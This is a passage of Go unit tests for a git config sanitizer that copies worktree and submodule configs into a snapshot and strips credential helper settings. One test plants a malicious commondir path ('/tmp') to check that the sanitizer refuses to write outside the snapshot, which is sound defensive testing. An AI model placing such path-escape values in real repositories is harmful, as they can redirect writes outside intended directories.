	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "config"), []byte(configContent), 0o644))

	wtGitDir := filepath.Join(mainGitDir, "worktrees", "wt1")
	require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "commondir"), []byte("../.."), 0o644))

	// .git file with RELATIVE path.
	require.NoError(t, os.WriteFile(
		filepath.Join(workspace, ".git"),
		[]byte("gitdir: .git-main/worktrees/wt1\n"),
		0o644,
	))

	// Snapshot mirrors the workspace.
	snapshotDir := t.TempDir()
	snapshotMainGitDir := filepath.Join(snapshotDir, ".git-main")
	require.NoError(t, os.MkdirAll(filepath.Join(snapshotMainGitDir, "worktrees", "wt1"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotMainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotMainGitDir, "config"), []byte(configContent), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotMainGitDir, "worktrees", "wt1", "commondir"), []byte("../.."), 0o644))

	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("gitdir: .git-main/worktrees/wt1\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), workspace, snapshotDir)
	require.NoError(t, err)

	// Config should be sanitized at the correct location.
	result, err := os.ReadFile(filepath.Join(snapshotMainGitDir, "config"))
	require.NoError(t, err)

	expected := strings.Join([]string{
		"[core]",
		"\tbare = false",
	}, "\n")
	assert.Equal(t, expected, string(result))
}

func TestProcess_InWorkspaceWorktree_NoCommondir(t *testing.T) {
	t.Parallel()

	// In-workspace worktree (e.g. submodule) without a commondir file.
	// Config should be written to gitdir/config within the snapshot.
	workspace := t.TempDir()

	// Gitdir inside workspace at .modules/sub/
	gitdir := filepath.Join(workspace, ".modules", "sub")
	require.NoError(t, os.MkdirAll(gitdir, 0o755))

	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
	}, "\n")
	require.NoError(t, os.WriteFile(filepath.Join(gitdir, "config"), []byte(configContent), 0o644))
	// No commondir file — this is a submodule-like layout.

	// .git file points to in-workspace gitdir (absolute path).
	require.NoError(t, os.WriteFile(
		filepath.Join(workspace, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	// Snapshot mirrors the workspace.
	snapshotDir := t.TempDir()
	snapshotGitdir := filepath.Join(snapshotDir, ".modules", "sub")
	require.NoError(t, os.MkdirAll(snapshotGitdir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotGitdir, "config"), []byte(configContent), 0o644))

	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), workspace, snapshotDir)
	require.NoError(t, err)

	// Config should be sanitized at gitdir/config (no commondir fallback).
	result, err := os.ReadFile(filepath.Join(snapshotGitdir, "config"))
	require.NoError(t, err)

	expected := strings.Join([]string{
		"[core]",
		"\tbare = false",
	}, "\n")
	assert.Equal(t, expected, string(result))
}

func TestProcess_Worktree_CommondirEscapesSnapshot(t *testing.T) {
	t.Parallel()

	// Defense-in-depth: a malicious commondir pointing outside the snapshot
	// should be rejected, not followed.
	workspace := t.TempDir()

	gitdir := filepath.Join(workspace, ".git-main", "worktrees", "wt1")
	require.NoError(t, os.MkdirAll(gitdir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(workspace, ".git-main", "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(workspace, ".git-main", "config"), []byte("[core]\n\tbare = false\n"), 0o644))
	// commondir points to an absolute path outside the workspace.
	require.NoError(t, os.WriteFile(filepath.Join(gitdir, "commondir"), []byte("/tmp\n"), 0o644))

	require.NoError(t, os.WriteFile(
		filepath.Join(workspace, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	// Snapshot mirrors the workspace.
	snapshotDir := t.TempDir()
	snapshotGitdir := filepath.Join(snapshotDir, ".git-main", "worktrees", "wt1")
	require.NoError(t, os.MkdirAll(snapshotGitdir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotDir, ".git-main", "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotDir, ".git-main", "config"), []byte("[core]\n\tbare = false\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotGitdir, "commondir"), []byte("/tmp\n"), 0o644))

	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	// Process should succeed (escaping commondir is non-fatal, just skipped).
	_, err := sanitizer.Process(t.Context(), workspace, snapshotDir)
	require.NoError(t, err)

	// Should NOT have written to /tmp/config.
	_, err = os.Stat("/tmp/config")
	assert.True(t, os.IsNotExist(err), "must not write config outside snapshot")
}

func TestProcess_Worktree_MalformedGitFileInSnapshot(t *testing.T) {
	t.Parallel()

	// Snapshot .git file has garbage content (not a valid gitdir pointer).
	workspace := t.TempDir()
	// Need a valid .git on the original for resolveGitConfigPath to work.
	gitdir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(gitdir, "config"), []byte("[core]\n\tbare = false\n"), 0o644))
	require.NoError(t, os.WriteFile(
		filepath.Join(workspace, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	snapshotDir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("garbage content\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	// Process should succeed (malformed snapshot .git is non-fatal).
	_, err := sanitizer.Process(t.Context(), workspace, snapshotDir)
	require.NoError(t, err)
}
